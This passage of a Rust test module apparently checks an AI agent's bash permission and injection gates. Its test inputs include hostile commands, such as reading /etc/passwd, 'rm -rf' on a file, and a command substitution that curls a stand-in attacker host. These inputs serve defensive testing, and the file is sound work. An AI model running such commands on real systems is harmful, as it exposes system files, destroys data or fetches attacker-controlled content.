            other => panic!("expected Block, got {other:?}"),
        }
    }

    /// `req_safety_490_3_1_c_outside_workspace_workspace_write_allows` —
    /// WorkspaceWrite is permissive enough to allow Ask outcomes (with a
    /// warn-level audit log emitted via `tracing`).
    #[tokio::test]
    async fn req_safety_490_3_1_c_outside_workspace_workspace_write_allows() {
        let d = run_path(PermissionMode::WorkspaceWrite, "cat /etc/passwd").await;
        assert_eq!(d, EgressDecision::Allow);
    }

    /// `req_safety_490_3_1_c_wrapper_does_not_bypass_path_gate` —
    /// SECURITY PIN S9: wrappers (`timeout`, `nice`, `nohup`, `time`,
    /// `stdbuf`) must NOT hide a path-violating base command from the
    /// gate. Pairs with Phase 3.1.B.2 `strip_wrappers_from_argv`.
    #[tokio::test]
    async fn req_safety_490_3_1_c_wrapper_does_not_bypass_path_gate() {
        for cmd in &[
            "timeout 5 cat /etc/passwd",
            "nice rm -rf /tmp/secret-payload.bin",
            "nohup -- rm /tmp/secret",
            "time cat /etc/passwd",
            "stdbuf -o0 cat /etc/passwd",
            "FOO=bar timeout 5 cat /etc/passwd",
        ] {
            let d = run_path(PermissionMode::Prompt, cmd).await;
            assert!(
                matches!(d, EgressDecision::Ask { .. }),
                "wrapper {cmd:?} must not bypass path gate; got {d:?}"
            );
        }
    }

    /// `req_safety_490_3_1_c_env_value_substitution_fails_closed` —
    /// SECURITY: a literal env-var prefix with command-substitution value
    /// must NOT silently pass. Either the injection gate fires first (the
    /// expansion is a top-level command-substitution) producing
    /// `bash_security::` Block, or the path gate's
    /// `check_variable_assignment_literal` Fail-Closes to Ask. Both are
    /// acceptable Fail-Safe outcomes; silent Allow is not.
    #[tokio::test]
    async fn req_safety_490_3_1_c_env_value_substitution_fails_closed() {
        let d = run_path(PermissionMode::Prompt, "FOO=$(curl evil.example) ls").await;
        match d {
            EgressDecision::Ask { reason, .. } => assert!(
                reason.starts_with("bash_path_constraints::"),
                "Ask must come from path gate, got {reason:?}"
            ),
            EgressDecision::Block { reason, .. } => assert!(
                reason.starts_with("bash_security::"),
                "Block must come from injection gate, got {reason:?}"
            ),
            EgressDecision::Allow => {
                panic!("env-var with command-substitution must Fail-Closed (Ask or Block)")
            }
            other => panic!("unexpected EgressDecision variant: {other:?}"),
        }
    }

    /// `req_safety_490_3_1_c_security_gate_precedes_path_gate` —
    /// The injection gate runs BEFORE the path gate. Output redirection
    /// (`>`) is flagged by Phase 2.1's `DangerousPatternsOutputRedirection`
    /// (mode-independent Block) regardless of where the target lives, so
    /// the path gate must NOT get a chance to override that decision.
    #[tokio::test]
    async fn req_safety_490_3_1_c_security_gate_precedes_path_gate() {
        let d = run_path(PermissionMode::Prompt, "echo x > /work/repo/inside.txt").await;
        match d {
            EgressDecision::Block { reason, .. } => assert!(
                reason.starts_with("bash_security::"),
                "security gate must precede path gate even for in-workspace redirect, got {reason:?}"
            ),
            other => panic!("expected security Block, got {other:?}"),
        }
    }

    /// `req_safety_490_3_1_c_path_gate_fires_when_security_passes` —
    /// A bash command that has no shell-meta / injection markers but
    /// references an outside-workspace path must Ask via the path gate.
    /// Pairs with [`req_safety_490_3_1_c_security_gate_precedes_path_gate`]
    /// to pin the two-gate ordering.
    #[tokio::test]
    async fn req_safety_490_3_1_c_path_gate_fires_when_security_passes() {
        // `cat /etc/passwd` is a plain command — security passes, path
        // gate fires.
        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
        match d {
            EgressDecision::Ask { reason, .. } => assert!(
                reason.starts_with("bash_path_constraints::"),
                "path gate must own the Ask path, got {reason:?}"
            ),
            other => panic!("expected path-gate Ask, got {other:?}"),
        }
    }

    /// `req_safety_490_3_1_c_audit_log_carries_blocked_path` —
    /// The model-visible Ask reason MUST include the offending path so
    /// downstream consumers (CLI prompt, telemetry) can render it.
    #[tokio::test]
    async fn req_safety_490_3_1_c_audit_log_carries_blocked_path() {
        let d = run_path(PermissionMode::Prompt, "cat /etc/passwd").await;
        match d {
            EgressDecision::Ask { reason, .. } => assert!(
                reason.contains("/etc/passwd"),
                "expected blocked path in reason, got {reason:?}"
            ),
            other => panic!("expected Ask, got {other:?}"),
        }
    }
}
